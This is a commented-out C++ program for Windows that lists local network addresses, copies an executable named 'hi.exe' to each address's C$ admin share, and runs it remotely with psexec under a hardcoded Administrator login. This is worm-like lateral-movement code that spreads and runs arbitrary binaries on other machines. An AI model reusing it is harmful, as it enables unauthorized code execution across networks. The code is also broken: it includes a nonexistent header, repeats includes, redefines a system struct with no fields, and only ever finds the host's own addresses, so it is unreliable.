/*#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <windows.h>
#include <lm.h>
#include <sstream>
#include <iostream>
#include <vector>
#include <string>
#include <windows.h>
#include <iphlpapi.h>
#include <ws2tcpip.h>
#include <winsock2.h>
#include <windowsx.h16>
#include <Iphlpapi.h>
#include <icmpapi.h>
#include <iptypes.h>
#include <winsock2.h>
#define INET_ADDRSTRLEN 16
#include <WinDef.h>
#include <IcmpAPI.h>
#include <icmpapi.h>
#include <Iphlpapi.h>
#include <Windows.h>
#define WORKING_BUFFER_SIZE 15000
#define MAX_TRIES 3
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")
#include <cstdlib>
using namespace std;

typedef struct _IP_ADAPTER_ADDRESSES {
    // Structure fields representing adapter information
} IP_ADAPTER_ADDRESSES, *PIP_ADAPTER_ADDRESSES;

struct Device {
    std::string ip;
    std::string mac;
};

std::vector<Device> discover_devices() {
    std::vector<Device> devices;
    DWORD dwSize = 0;
    DWORD dwRetVal = 0;

    // Allocate a 16K buffer to start with
    ULONG flags = GAA_FLAG_INCLUDE_PREFIX;
    ULONG family = AF_INET;

    PIP_ADAPTER_ADDRESSES pAddresses = NULL;
    PIP_ADAPTER_ADDRESSES pCurrAddresses = NULL;
    PIP_ADAPTER_UNICAST_ADDRESS pUnicast = NULL;
    PIP_ADAPTER_ANYCAST_ADDRESS pAnycast = NULL;
    PIP_ADAPTER_MULTICAST_ADDRESS pMulticast = NULL;
    IP_ADAPTER_DNS_SERVER_ADDRESS *pDnServer = NULL;
    ULONG outBufLen = WORKING_BUFFER_SIZE;
    ULONG Iterations = 0;

    do {
        pAddresses = (IP_ADAPTER_ADDRESSES *)malloc(outBufLen);
        if (pAddresses == NULL) {
            std::cerr << "Memory allocation failed for IP_ADAPTER_ADDRESSES struct" << std::endl;
            return devices;
        }

        dwRetVal = GetAdaptersAddresses(family, flags, NULL, pAddresses, &outBufLen);
        if (dwRetVal == ERROR_BUFFER_OVERFLOW) {
            free(pAddresses);
            pAddresses = NULL;
        } else {
            break;
        }

        Iterations++;
    } while ((dwRetVal == ERROR_BUFFER_OVERFLOW) && (Iterations < MAX_TRIES));

    if (dwRetVal == NO_ERROR) {
        pCurrAddresses = pAddresses;
        while (pCurrAddresses) {
            pUnicast = pCurrAddresses->FirstUnicastAddress;
            if (pUnicast != NULL) {
                for (int i = 0; pUnicast != NULL; i++) {
                    if (pUnicast->Address.lpSockaddr->sa_family == AF_INET) {
                        sockaddr_in *sa_in = (sockaddr_in *)pUnicast->Address.lpSockaddr;
                        char str[INET_ADDRSTRLEN];
                        inet_ntop(AF_INET, &(sa_in->sin_addr), str, INET_ADDRSTRLEN);

                        // Using ARP to get MAC address
                        IPAddr DestIp = inet_addr(str);
                        ULONG MacAddr[2];       // For MAC address
                        ULONG PhysAddrLen = 6;  // Length of MAC address
                        memset(&MacAddr, 0xff, sizeof(MacAddr));

                        dwRetVal = SendARP(DestIp, 0, &MacAddr, &PhysAddrLen);
                        if (dwRetVal == NO_ERROR) {
                            BYTE *bPhysAddr = (BYTE *)&MacAddr;
                            std::ostringstream oss;
                            for (int i = 0; i < (int)PhysAddrLen; i++) {
                                if (i == (PhysAddrLen - 1))
                                    oss << std::hex << (int)bPhysAddr[i];
                                else
                                    oss << std::hex << (int)bPhysAddr[i] << "-";
                            }

                            Device device;
                            device.ip = str;
                            device.mac = oss.str();
                            devices.push_back(device);
                        }
                    }
                    pUnicast = pUnicast->Next;
                }
            }
            pCurrAddresses = pCurrAddresses->Next;
        }
    }

    if (pAddresses) {
        free(pAddresses);
    }

    return devices;
}


bool send_file(const std::string& ip, const std::string& file_path, const std::string& dest_path) {
    std::stringstream ss;
    ss << "\\\\" << ip << "\\" << dest_path;
    std::string remote_path = ss.str();

    if (!CopyFile(file_path.c_str(), remote_path.c_str(), FALSE)) {
        std::cerr << "Failed to send file to " << ip << ": " << GetLastError() << std::endl;
        return false;
    }
    return true;
}

bool execute_file(const std::string& ip, const std::string& file_path) {
    std::stringstream ss;
    ss << "psexec \\\\" << ip << " -u Administrator -p YourPassword -accepteula " << file_path;
    std::string command = ss.str();

    if (system(command.c_str()) != 0) {
        std::cerr << "Failed to execute file on " << ip << std::endl;
        return false;
    }
    return true;
}

int main() {
    std::string file_path = "hi.exe";
    std::string dest_path = "C$\\temp\\executable.exe"; // Remote path on the target machine

    std::vector<Device> devices = discover_devices();

    for (const auto& device : devices) {
        if (send_file(device.ip, file_path, dest_path)) {
            std::cout << "File sent to " << device.ip << " successfully." << std::endl;
            if (execute_file(device.ip, dest_path)) {
                std::cout << "File executed on " << device.ip << " successfully." << std::endl;
            } else {
                std::cerr << "Failed to execute file on " << device.ip << std::endl;
            }
        } else {
            std::cerr << "Failed to send file to " << device.ip << std::endl;
        }
    }

    return 0;
}
*/